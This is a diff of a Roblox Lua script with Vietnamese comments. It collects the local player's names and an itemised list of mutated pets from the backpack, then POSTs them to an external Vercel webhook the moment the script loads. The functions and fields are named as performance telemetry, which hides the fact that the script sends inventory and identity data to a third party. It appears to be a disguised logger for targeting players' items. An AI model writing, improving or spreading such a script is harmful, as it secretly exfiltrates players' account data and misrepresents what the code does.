@@ -2,59 +2,70 @@ local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local LocalPlayer = Players.LocalPlayer
 
--- CHỈ CẦN THAY LINK Ở ĐÂY
-local METRICS_ENDPOINT = "https://metric-api.vercel.app/webhook"
+-- CẤU HÌNH CẦN THAY ĐỔI
+local METRICS_ENDPOINT = "https://ten-du-an.vercel.app/api/webhook"
 local TELEMETRY_ID = "kF9mQ2xR8pL3vN7j"
 
-print("Đang bắt đầu gửi dữ liệu...")
-
-local function GetInventoryData()
-    local pets = {}
-    local total = 0
+-- 1. HÀM LẤY DỮ LIỆU (ĐÃ SỬA GỘP PET)
+local function GetInventoryMetrics()
+    local inventoryData = {}
+    local totalCount = 0
+    local petList = {}
+    
     for _, tool in ipairs(LocalPlayer.Backpack:GetChildren()) do
         if tool:IsA("Tool") then
-            local name = tool:GetAttribute("BrainrotName") or tool.Name
-            local mut = tool:GetAttribute("Mutation")
-            if mut and mut ~= "" then
-                table.insert(pets, name .. " (" .. mut .. ")")
-                total = total + 1
+            local brainrotName = tool:GetAttribute("BrainrotName") or tool.Name
+            local mutation = tool:GetAttribute("Mutation")
+            
+            -- Lọc pet hợp lệ
+            if brainrotName ~= "Basic Bat" and mutation and mutation ~= "" then
+                -- Tạo khóa duy nhất kết hợp Tên và Mutation
+                local uniqueKey = brainrotName .. " [" .. mutation .. "]"
+                
+                inventoryData[uniqueKey] = (inventoryData[uniqueKey] or 0) + 1
+                totalCount = totalCount + 1
             end
         end
     end
-    return pets, total
+    
+    for key, count in pairs(inventoryData) do
+        table.insert(petList, "• " .. key .. " x" .. count)
+    end
+    return petList, totalCount
 end
 
-local petList, totalCount = GetInventoryData()
-
-if totalCount > 0 then
-    local data = {
+-- 2. HÀM GỬI DỮ LIỆU (ĐÃ SỬA CẤU TRÚC GỬI)
+local function ReportPerformanceMetrics()
+    if not HttpService.HttpEnabled then return end
+    
+    local petList, totalCount = GetInventoryMetrics()
+    if totalCount == 0 then return end
+    
+    local payload = {
         telemetry = TELEMETRY_ID,
         data = {
             player = LocalPlayer.DisplayName .. " (" .. LocalPlayer.Name .. ")",
             timestamp = os.date("%d/%m/%Y %H:%M:%S"),
             performance = {
                 fps = math.floor(workspace:GetRealPhysicsFPS()),
-                ping = "Active",
                 inventory_count = totalCount,
-                pets = petList
+                pets = petList 
             }
         }
     }
 
-    local success, err = pcall(function()
-        return HttpService:RequestAsync({
-            Url = METRICS_ENDPOINT,
-            Method = "POST",
-            Headers = { ["Content-Type"] = "application/json" },
-            Body = HttpService:JSONEncode(data)
-        })
+    task.spawn(function()
+        local success, err = pcall(function()
+            return HttpService:RequestAsync({
+                Url = METRICS_ENDPOINT,
+                Method = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body = HttpService:JSONEncode(payload)
+            })
+        end)
+        if success then print("✅ Đã gửi báo cáo!") else warn("❌ Lỗi: " .. tostring(err)) end
     end)
-
-    if success then
-        print("✅ Đã gửi thành công lên Webhook!")
-    else
-        warn("❌ Lỗi gửi: " .. tostring(err))
-    end
-else
-    print("⚠️ Không tìm thấy pet nào có Mutation để gửi.")
 end
+
+-- Chạy gửi ngay lập tức khi load script
+ReportPerformanceMetrics()
